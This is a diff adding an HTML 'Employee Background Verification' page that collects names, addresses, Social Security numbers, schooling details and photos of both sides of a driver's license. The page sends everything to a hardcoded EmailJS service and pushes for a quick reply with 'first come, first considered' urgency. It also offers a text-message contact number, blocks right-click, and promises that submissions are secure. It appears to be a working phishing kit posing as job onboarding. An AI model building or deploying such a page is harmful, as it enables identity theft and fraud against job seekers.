@@ -1,0 +1,208 @@
+<!DOCTYPE html> 
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Employee Background Verification Form</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  
+  <!-- Uploadcare widget -->
+  <script>
+    UPLOADCARE_PUBLIC_KEY = "87c1f013fe74aca18e3a";
+  </script>
+  <script src="https://ucarecdn.com/libs/widget/3.x/uploadcare.full.min.js"></script>
+  
+  <!-- EmailJS -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script>
+    emailjs.init("3KSM85VlMXzH-fldA");
+  </script>
+
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f4f7f8;
+      color: #333;
+      max-width: 600px;
+      margin: auto;
+      padding: 30px;
+    }
+    h2 {
+      text-align: center;
+      color: #0b5ed7;
+    }
+    form {
+      background: #fff;
+      padding: 25px;
+      border-radius: 10px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+      margin-bottom: 20px;
+    }
+    label {
+      margin-top: 10px;
+      display: block;
+      font-weight: bold;
+    }
+    input, select {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      margin-bottom: 15px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+    button {
+      background: #0b5ed7;
+      color: white;
+      padding: 12px;
+      width: 100%;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .note {
+      font-size: 0.9em;
+      color: #777;
+    }
+    #thankYou {
+      display: none;
+      background: #d4edda;
+      color: #155724;
+      padding: 25px;
+      border-radius: 10px;
+      text-align: center;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <h2>Employee Background Verification</h2>
+
+  <!-- Single Form -->
+  <form id="formPage1">
+    <label>Full Name</label>
+    <input type="text" name="fullName" required />
+
+    <label>Email Address</label>
+    <input type="email" name="email" required />
+
+    <label>Phone Number</label>
+    <input type="tel" name="phone" required />
+
+    <label>Mailing Address</label>
+    <input type="text" name="mailing_address" required />
+
+    <label>City</label>
+    <input type="text" name="city" required />
+
+    <label>State</label>
+    <input type="text" name="state" required />
+
+    <label>Zip Code</label>
+    <input type="text" name="zip" pattern="\d{5}" required />
+
+    <label>Social Security Number (SSN)</label>
+    <input type="text" name="ssn" placeholder="123-45-6789" required />
+
+    <label>High School Name</label>
+    <input type="text" name="high_school_name" required />
+
+    <label>High School City, State</label>
+    <input type="text" name="high_school_location" placeholder="e.g., Dallas, TX" required />
+
+    <label>Year Started</label>
+    <input type="number" name="year_started" min="1900" max="2099" step="1" required />
+
+    <label>Year Graduated</label>
+    <input type="number" name="year_graduated" min="1900" max="2099" step="1" required />
+
+    <label>Upload the frontpage of your driver's license</label>
+    <input type="hidden" role="uploadcare-uploader" name="id_front" data-clearable />
+
+    <label>Upload the back page of your driver's license</label>
+    <input type="hidden" role="uploadcare-uploader" name="id_back" data-clearable />
+
+    <label>Digital Signature (Type Your Full Name)</label>
+    <input type="text" name="signature" required />
+
+    <p class="note">
+      We will never request your banking login, PIN, or password. All submissions are secure and used solely for onboarding purposes.
+    </p>
+
+    <button type="button" id="submitBtn">Submit</button>
+  </form>
+
+  <!-- Final Thank You Message -->
+  <div id="thankYou">
+    <h3>✅ Success! Your information has been received.</h3>
+    <p>
+      A team member will contact you via text from <strong>(840) 214-0001</strong> or email.<br>
+      Once it’s completed, we’ll get back to you within 24–48 hours with the outcome and next steps.
+    </p>
+    <p>
+      Positions are first come, first considered, so respond back asap when you get our text or email.
+    </p>
+  </div>
+
+  <!-- JavaScript for Form Handling -->
+  <script>
+    const formPage1 = document.getElementById('formPage1');
+    const submitBtn = document.getElementById('submitBtn');
+
+    submitBtn.addEventListener('click', () => {
+      if (formPage1.reportValidity()) {
+        if (!formPage1.id_front.value || !formPage1.id_back.value) {
+          alert("Please upload both front and back of your government-issued ID.");
+          return;
+        }
+
+        const form1Data = {
+          fullName: formPage1.fullName.value,
+          email: formPage1.email.value,
+          phone: formPage1.phone.value,
+          mailing_address: formPage1.mailing_address.value,
+          city: formPage1.city.value,
+          state: formPage1.state.value,
+          zip: formPage1.zip.value,
+          ssn: formPage1.ssn.value,
+          high_school_name: formPage1.high_school_name.value,
+          high_school_location: formPage1.high_school_location.value,
+          year_started: formPage1.year_started.value,
+          year_graduated: formPage1.year_graduated.value,
+          id_front: formPage1.id_front.value,
+          id_back: formPage1.id_back.value,
+          signature: formPage1.signature.value,
+          submissionTime: new Date().toLocaleString()
+        };
+
+        emailjs.send("service_pykfhaa", "template_9jwdgon", form1Data)
+          .then(() => {
+            // Redirect instantly after success
+            window.location.href = "#thankYou";
+            document.getElementById("thankYou").style.display = "block";
+            formPage1.style.display = "none";
+          })
+          .catch((error) => {
+            console.error("EmailJS Error:", error);
+            alert("Failed to submit the form. Please try again.");
+          });
+      }
+    });
+  </script>
+
+  <!-- LiveChat -->
+  <script>
+    window.__lc = window.__lc || {};
+    window.__lc.license = 16972020;
+    window.__lc.integration_name = "manual_channels";
+    window.__lc.product_name = "livechat";
+    (function(n,t,c){function i(n){return e._h?e._h.apply(null,n):e._q.push(n)}var e={_q:[],_h:null,_v:"2.0",on:function(){i(["on",c.call(arguments)])},once:function(){i(["once",c.call(arguments)])},off:function(){i(["off",c.call(arguments)])},get:function(){if(!e._h)throw new Error("[LiveChatWidget] You can't use getters before load.");return i(["get",c.call(arguments)])},call:function(){i(["call",c.call(arguments)])},init:function(){var n=t.createElement("script");n.async=!0,n.type="text/javascript",n.src="https://cdn.livechatinc.com/tracking.js",t.head.appendChild(n)}};!n.__lc.asyncInit&&e.init(),n.LiveChatWidget=n.LiveChatWidget||e}(window,document,[].slice))
+  </script>
+  <noscript><a href="https://www.livechat.com/chat-with/16972020/" rel="nofollow">Chat with us</a>, powered by <a href="https://www.livechat.com/?welcome" rel="noopener nofollow" target="_blank">LiveChat</a></noscript>
+
+  <!-- Disable Right-Click -->
+  <script>
+    document.addEventListener('contextmenu', event => event.preventDefault());
+  </script>
+</body>
+</html>
